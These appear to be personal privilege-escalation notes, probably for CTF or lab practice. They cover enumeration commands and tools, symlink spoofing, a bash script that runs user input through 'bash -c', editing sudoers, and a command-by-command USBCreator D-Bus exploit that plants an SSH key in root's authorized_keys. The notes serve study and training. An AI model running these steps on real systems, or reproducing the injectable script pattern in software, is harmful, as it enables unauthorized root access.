# Linux
Everything to check when trying to become root


# Commands
- `sudo -l`
- `ps aux | grep <user>`
- `netstat -tulnp`
- `ls - ltrh` --> sort files by latest update (the one that is close to u by date, could be important)
- `kill -9 <pid>`


# Directories
- ~/
- ~/.ssh
- /tmp
- /dev/shm
- /opt
- /var *and all within*
- /usr
- /usr/local


# Tools
- LinPeas
- pspy64
- [GTFOBins](https://gtfobins.github.io/) (online)


# DIR / file copy (symlink)
If there's a DIR or a file that is being copied one can either create a symlink or a direct spoof of the actual file so that the copied item will be spoofed and have the data the attacker wants.


# Bash file command execute
If a file executes any variable, one might be able to write payload to it.

## Example
```bash
#!/bin/bash

echo -e "Input:\t"
read myvar

/bin/bash -c $myvar
```
Note: Here one can insert malicious code to be executed by the program.



# Binaries (file read and write)
- If a gven binary allows you to edit files and one's not yet root, the attacker can try to edit the **sudoers** file and put the user in there, hence gaining root privs.      
- Also, maybe try copying the original file and add yourself to it and replace the original file with the altered version.



# Processes / Buses

## Monitor buses
`busctl` can be used to monitor and examine the D-Bus.

## Vulnerable interfaces

### USBCreator D-Bus | com.ubuntu.USBCreator
#### Steps to exploit
```bash

remote-machine> ps auwx | grep usb

remote-machine> echo "attack-machine id_rsa.pub key" > ~/authorized_keys

remote-machine> gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/remote/authorized_keys /root/.ssh/authorized_keys true

attack-machine> ssh -i id_rsa root@10.10.10.10
```
Help: [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)